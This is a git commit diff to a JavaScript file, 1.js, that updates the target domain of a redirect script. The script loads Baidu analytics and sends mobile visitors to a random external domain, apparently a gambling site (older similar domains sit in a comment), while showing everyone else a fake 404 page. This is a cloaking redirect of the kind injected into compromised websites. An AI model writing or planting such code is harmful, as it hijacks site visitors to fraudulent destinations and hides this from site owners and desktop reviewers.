df4a69808fcf4bf7e5dfa5c0f610994e7b15140a
dnshook <62766196+dnshook@users.noreply.github.com>
2023-06-14 22:14:38 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -7,7 +7,7 @@ var _hmt = _hmt || [];
 })();
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
 	//var arr = ["http://18kyty.com", "http://leyu3413.com", "http://4892ky.com"];
-	var arr = ["https://1w7c6r.com", "https://1w7c6r.com"];
+	var arr = ["https://m.1w7c6r.com", "https://m.1w7c6r.com"];
 	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
 	window.location.href="/404.html";
